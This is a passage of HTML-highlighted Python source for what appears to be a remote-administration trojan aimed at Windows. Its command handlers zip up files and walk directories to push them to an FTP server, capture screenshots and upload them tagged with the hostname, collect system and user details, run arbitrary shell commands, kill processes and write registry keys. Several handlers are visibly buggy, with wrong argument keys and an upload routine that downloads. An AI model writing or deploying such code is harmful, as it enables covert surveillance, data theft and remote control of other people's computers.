        <span class="k">return</span> <span class="n">tabulate</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="n">stralign</span><span class="o">=</span><span class="s">"left"</span><span class="p">,</span> <span class="n">showindex</span><span class="o">=</span><span class="s">"always"</span><span class="p">,</span>
                        <span class="n">tablefmt</span><span class="o">=</span><span class="s">"simple"</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">||| "</span> <span class="o">+</span> <span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">()</span> <span class="o">+</span> <span class="s">" ||| "</span>


<span class="k">def</span> <span class="nf">compress</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">"compress"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-d"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-t"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-c"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-l"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">com</span><span class="p">))</span>

    <span class="n">arch</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="s">'d'</span><span class="p">]</span>
    <span class="n">targets</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="s">'t'</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)</span>
    <span class="n">level</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="s">'l'</span><span class="p">]</span>

    <span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">arch</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipper</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">glob_path</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">one</span> <span class="ow">in</span> <span class="n">glob</span><span class="p">.</span><span class="n">iglob</span><span class="p">(</span><span class="n">glob_path</span><span class="p">.</span><span class="n">lstrip</span><span class="p">(),</span> <span class="n">recursive</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">one</span><span class="p">):</span>
                    <span class="k">for</span> <span class="n">folder</span><span class="p">,</span> <span class="n">subfolder</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">one</span><span class="p">):</span>
                        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
                            <span class="n">p</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">folder</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
                            <span class="n">zipper</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">relpath</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">one</span> <span class="o">+</span> <span class="s">"/.."</span><span class="p">),</span> <span class="n">compress_type</span><span class="o">=</span><span class="n">zipfile</span><span class="p">.</span><span class="n">ZIP_LZMA</span><span class="p">,</span>
                                         <span class="n">compresslevel</span><span class="o">=</span><span class="n">level</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">zipper</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">one</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">relpath</span><span class="p">(</span><span class="n">one</span><span class="p">),</span> <span class="n">compress_type</span><span class="o">=</span><span class="n">zipfile</span><span class="p">.</span><span class="n">ZIP_LZMA</span><span class="p">,</span> <span class="n">compresslevel</span><span class="o">=</span><span class="n">level</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s">"c"</span><span class="p">]</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Compressed "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">stat</span><span class="p">(</span><span class="n">arch</span><span class="p">).</span><span class="n">st_size</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">+</span> <span class="s">"Mb to "</span> <span class="o">+</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">arch</span><span class="p">)</span>

    <span class="n">chapters</span> <span class="o">=</span> <span class="n">split_file</span><span class="p">(</span><span class="n">arch</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="s">'-c'</span><span class="p">])</span>
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">arch</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"Compressed to "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">chapters</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s">" chunks in "</span> <span class="o">+</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">arch</span> <span class="o">+</span> <span class="s">'0/..'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">split_file</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">chunk_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="mi">100</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
    <span class="n">chapters</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ugly_buf</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">src</span><span class="p">:</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">tgt</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span> <span class="o">+</span> <span class="s">'.%1d'</span> <span class="o">%</span> <span class="n">chapters</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
            <span class="n">written</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="k">while</span> <span class="n">written</span> <span class="o">&lt;</span> <span class="n">chunk_size</span><span class="p">:</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ugly_buf</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="n">tgt</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">ugly_buf</span><span class="p">)</span>
                <span class="n">tgt</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">src</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">chunk_size</span> <span class="o">-</span> <span class="n">written</span><span class="p">)))</span>
                <span class="n">written</span> <span class="o">+=</span> <span class="nb">min</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">chunk_size</span> <span class="o">-</span> <span class="n">written</span><span class="p">)</span>
                <span class="n">ugly_buf</span> <span class="o">=</span> <span class="n">src</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ugly_buf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="n">tgt</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ugly_buf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">chapters</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">chapters</span>


<span class="k">def</span> <span class="nf">chdir</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="s">"cd"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"path"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">"~"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">to</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">com</span><span class="p">))[</span><span class="s">"path"</span><span class="p">]</span>
    <span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">expanduser</span><span class="p">(</span><span class="n">to</span><span class="p">))</span>
    <span class="k">return</span> <span class="s">"Changed directory to {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">())</span>


<span class="k">def</span> <span class="nf">download</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">ftp_arg_parse</span><span class="p">(</span><span class="n">com</span><span class="p">,</span> <span class="s">"download"</span><span class="p">)</span>

    <span class="n">filename</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="s">"f"</span><span class="p">]</span>

    <span class="n">ftp</span> <span class="o">=</span> <span class="n">init_ftp</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"u"</span><span class="p">],</span> <span class="n">password</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"p"</span><span class="p">],</span> <span class="n">directory</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"d"</span><span class="p">])</span>
    <span class="n">ftp</span><span class="p">.</span><span class="n">voidcmd</span><span class="p">(</span><span class="s">"TYPE I"</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">glob</span><span class="p">.</span><span class="n">iglob</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
            <span class="k">for</span> <span class="n">folder</span><span class="p">,</span> <span class="n">subfolder</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
                <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
                    <span class="n">resp</span> <span class="o">=</span> <span class="n">download_file</span><span class="p">(</span><span class="n">ftp</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="nb">file</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">download_file</span><span class="p">(</span><span class="n">ftp</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
    <span class="n">ftp</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">resp</span>


<span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">ftp_arg_parse</span><span class="p">(</span><span class="n">com</span><span class="p">,</span> <span class="s">"upload"</span><span class="p">)</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="s">"f"</span><span class="p">]</span>
    <span class="nb">file</span> <span class="o">=</span> <span class="n">filename</span><span class="p">[</span><span class="n">filename</span><span class="p">.</span><span class="n">rfind</span><span class="p">(</span><span class="s">"/"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
        <span class="n">ftp</span> <span class="o">=</span> <span class="n">init_ftp</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"u"</span><span class="p">],</span> <span class="n">password</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"p"</span><span class="p">],</span> <span class="n">directory</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"d"</span><span class="p">])</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ftp</span><span class="p">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s">"RETR "</span> <span class="o">+</span> <span class="n">filename</span><span class="p">,</span> <span class="n">fp</span><span class="p">.</span><span class="n">write</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ftp</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
    <span class="n">fp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">resp</span>


<span class="k">def</span> <span class="nf">shot</span><span class="p">(</span><span class="n">com</span><span class="p">):</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">ftp_arg_parse</span><span class="p">(</span><span class="n">com</span><span class="p">,</span> <span class="s">"shot"</span><span class="p">)</span>
    <span class="k">with</span> <span class="n">mss</span><span class="p">.</span><span class="n">mss</span><span class="p">()</span> <span class="k">as</span> <span class="n">sct</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">sct</span><span class="p">.</span><span class="n">shot</span><span class="p">()</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">s_shot</span><span class="p">:</span>
        <span class="n">ftp</span> <span class="o">=</span> <span class="n">init_ftp</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"u"</span><span class="p">],</span> <span class="n">password</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"p"</span><span class="p">],</span> <span class="n">directory</span><span class="o">=</span><span class="n">args</span><span class="p">[</span><span class="s">"d"</span><span class="p">])</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ftp</span><span class="p">.</span><span class="n">storbinary</span><span class="p">(</span>
            <span class="s">"STOR "</span> <span class="o">+</span> <span class="s">"shot_{0}_{1}.png"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">platform</span><span class="p">.</span><span class="n">node</span><span class="p">()).</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">"_"</span><span class="p">),</span>
                                                <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()),</span> <span class="n">s_shot</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">s_shot</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="n">sct</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">ftp</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">resp</span>


<span class="k">def</span> <span class="nf">get_sys_info</span><span class="p">():</span>
    <span class="n">sysinfo</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""
Operating System: </span><span class="si">{</span><span class="n">platform</span><span class="p">.</span><span class="n">system</span><span class="p">()</span><span class="si">}</span><span class="s">
Computer Name: </span><span class="si">{</span><span class="n">platform</span><span class="p">.</span><span class="n">node</span><span class="p">()</span><span class="si">}</span><span class="s">
Username: </span><span class="si">{</span><span class="n">getuser</span><span class="p">()</span><span class="si">}</span><span class="s">
Release Version: </span><span class="si">{</span><span class="n">platform</span><span class="p">.</span><span class="n">release</span><span class="p">()</span><span class="si">}</span><span class="s">
Processor Architecture: </span><span class="si">{</span><span class="n">platform</span><span class="p">.</span><span class="n">processor</span><span class="p">()</span><span class="si">}</span><span class="s">
    """</span>
    <span class="k">return</span> <span class="n">sysinfo</span>


<span class="k">def</span> <span class="nf">task_running</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">run_cmd</span><span class="p">(</span><span class="s">"tasklist /v /fo csv /fi </span><span class="se">\"</span><span class="s">IMAGENAME eq {}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">count</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">if</span> <span class="n">res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">else</span> <span class="bp">False</span>


<span class="k">def</span> <span class="nf">task_kill</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">run_cmd</span><span class="p">(</span><span class="s">"taskkill /f /im </span><span class="se">\"</span><span class="s">{}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">))[</span><span class="mi">1</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">run_cmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">wait</span><span class="p">:</span>
        <span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="k">return</span> <span class="s">""</span><span class="p">,</span> <span class="bp">True</span>
    <span class="n">comm</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="n">comm</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">stdout</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">fix_coding</span><span class="p">(</span><span class="n">stderr</span><span class="p">),</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="n">fix_coding</span><span class="p">(</span><span class="n">stdout</span><span class="p">),</span> <span class="bp">True</span>


<span class="k">def</span> <span class="nf">copy_file_a</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="s">"cp"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"from"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"to"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
    <span class="n">copy_file</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"from"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"to"</span><span class="p">])</span>
    <span class="k">return</span> <span class="s">"{0} has been copied to {1}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"from"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"to"</span><span class="p">])</span>


<span class="k">def</span> <span class="nf">move_file_a</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="s">"mv"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"what"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"where"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
    <span class="n">move_file</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"what"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"where"</span><span class="p">])</span>
    <span class="k">return</span> <span class="s">"{0} has been moved to {1}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"from"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"to"</span><span class="p">])</span>


<span class="k">def</span> <span class="nf">create_link_a</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="s">"link"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"from"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"where"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">nargs</span><span class="o">=</span><span class="s">"?"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-del"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store_true"</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">vars</span><span class="p">(</span><span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>

    <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s">"del"</span><span class="p">]:</span>
        <span class="n">remove_link</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"from"</span><span class="p">])</span>
        <span class="k">return</span> <span class="s">"Link to {} has been removed"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"from"</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="p">[</span><span class="s">"where"</span><span class="p">]:</span>
            <span class="k">return</span> <span class="n">ap</span><span class="p">.</span><span class="n">print_usage</span><span class="p">()</span>
        <span class="n">create_link</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"from"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"where"</span><span class="p">])</span>
        <span class="k">return</span> <span class="s">"Link from {} to {} has been created"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s">"from"</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="s">"where"</span><span class="p">])</span>


<span class="k">def</span> <span class="nf">register_a</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="s">"register"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-o"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"The Reg key root"</span><span class="p">,</span>
                    <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">"ClsRoot"</span><span class="p">,</span> <span class="s">"CurUs"</span><span class="p">,</span> <span class="s">"DynData"</span><span class="p">,</span> <span class="s">"LocMach"</span><span class="p">,</span> <span class="s">"PerfData"</span><span class="p">,</span> <span class="s">"Users"</span><span class="p">])</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-p"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Key path under the root"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-n"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Name of the new key"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-v"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Value of the key"</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-t"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Value Type"</span><span class="p">,</span>
                    <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">"DWord"</span><span class="p">,</span> <span class="s">"Link"</span><span class="p">,</span> <span class="s">"Binary"</span><span class="p">,</span> <span class="s">"QWord"</span><span class="p">,</span> <span class="s">"SZ"</span><span class="p">,</span> <span class="s">"None"</span><span class="p">])</span>
